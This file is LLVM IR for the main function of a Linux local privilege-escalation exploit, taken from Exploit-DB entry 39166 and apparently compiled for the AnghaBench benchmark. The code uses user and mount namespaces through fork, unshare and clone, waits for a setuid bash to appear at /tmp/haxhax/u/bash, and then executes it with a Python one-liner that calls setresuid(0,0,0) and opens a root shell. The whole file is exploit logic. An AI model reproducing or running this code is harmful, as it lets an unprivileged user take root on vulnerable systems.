; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_39166.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_39166.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.stat = type { i32 }

@CLONE_NEWNS = common dso_local global i32 0, align 4
@SIGCHLD = common dso_local global i32 0, align 4
@CLONE_NEWUSER = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [37 x i8] c"failed to create new user namespace\0A\00", align 1
@child_exec = common dso_local global i32 0, align 4
@child_stack = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [38 x i8] c"failed to create new mount namespace\0A\00", align 1
@.str.2 = private unnamed_addr constant [19 x i8] c"/tmp/haxhax/u/bash\00", align 1
@.str.3 = private unnamed_addr constant [5 x i8] c"bash\00", align 1
@.str.4 = private unnamed_addr constant [3 x i8] c"-p\00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@.str.6 = private unnamed_addr constant [91 x i8] c"rm -rf /tmp/haxhax;python -c \22import os;os.setresuid(0,0,0);os.execl('/bin/bash','bash');\22\00", align 1
@.str.7 = private unnamed_addr constant [25 x i8] c"couldn't create suid :(\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i64, align 8
  %8 = alloca i64, align 8
  %9 = alloca i32, align 4
  %10 = alloca %struct.stat, align 4
  %11 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = load i32, i32* @CLONE_NEWNS, align 4
  %13 = load i32, i32* @SIGCHLD, align 4
  %14 = or i32 %12, %13
  store i32 %14, i32* %9, align 4
  %15 = call i64 (...) @fork()
  store i64 %15, i64* %7, align 8
  %16 = icmp eq i64 %15, 0
  br i1 %16, label %17, label %45

17:                                               ; preds = %2
  %18 = load i32, i32* @CLONE_NEWUSER, align 4
  %19 = call i64 @unshare(i32 %18)
  %20 = icmp ne i64 %19, 0
  br i1 %20, label %21, label %24

21:                                               ; preds = %17
  %22 = load i32, i32* @stderr, align 4
  %23 = call i32 @fprintf(i32 %22, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str, i64 0, i64 0))
  br label %24

24:                                               ; preds = %21, %17
  %25 = call i64 (...) @fork()
  store i64 %25, i64* %8, align 8
  %26 = icmp eq i64 %25, 0
  br i1 %26, label %27, label %42

27:                                               ; preds = %24
  %28 = load i32, i32* @child_exec, align 4
  %29 = load i64, i64* @child_stack, align 8
  %30 = add nsw i64 %29, 1048576
  %31 = load i32, i32* %9, align 4
  %32 = call i64 @clone(i32 %28, i64 %30, i32 %31, i32* null)
  store i64 %32, i64* %11, align 8
  %33 = load i64, i64* %11, align 8
  %34 = icmp slt i64 %33, 0
  br i1 %34, label %35, label %39

35:                                               ; preds = %27
  %36 = load i32, i32* @stderr, align 4
  %37 = call i32 @fprintf(i32 %36, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.1, i64 0, i64 0))
  %38 = call i32 @exit(i32 -1) #3
  unreachable

39:                                               ; preds = %27
  %40 = load i64, i64* %11, align 8
  %41 = call i32 @waitpid(i64 %40, i32* %6, i32 0)
  br label %42

42:                                               ; preds = %39, %24
  %43 = load i64, i64* %8, align 8
  %44 = call i32 @waitpid(i64 %43, i32* %6, i32 0)
  store i32 0, i32* %3, align 4
  br label %57

45:                                               ; preds = %2
  %46 = call i32 @usleep(i32 300000)
  %47 = call i32 @wait(i32* null)
  %48 = call i32 @stat(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.2, i64 0, i64 0), %struct.stat* %10)
  %49 = getelementptr inbounds %struct.stat, %struct.stat* %10, i32 0, i32 0
  %50 = load i32, i32* %49, align 4
  %51 = icmp eq i32 %50, 35309
  br i1 %51, label %52, label %54

52:                                               ; preds = %45
  %53 = call i32 @execl(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.6, i64 0, i64 0), i32* null)
  br label %54

54:                                               ; preds = %52, %45
  %55 = load i32, i32* @stderr, align 4
  %56 = call i32 @fprintf(i32 %55, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.7, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %57

57:                                               ; preds = %54, %42
  %58 = load i32, i32* %3, align 4
  ret i32 %58
}

declare dso_local i64 @fork(...) #1

declare dso_local i64 @unshare(i32) #1

declare dso_local i32 @fprintf(i32, i8*) #1

declare dso_local i64 @clone(i32, i64, i32, i32*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @waitpid(i64, i32*, i32) #1

declare dso_local i32 @usleep(i32) #1

declare dso_local i32 @wait(i32*) #1

declare dso_local i32 @stat(i8*, %struct.stat*) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i8*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
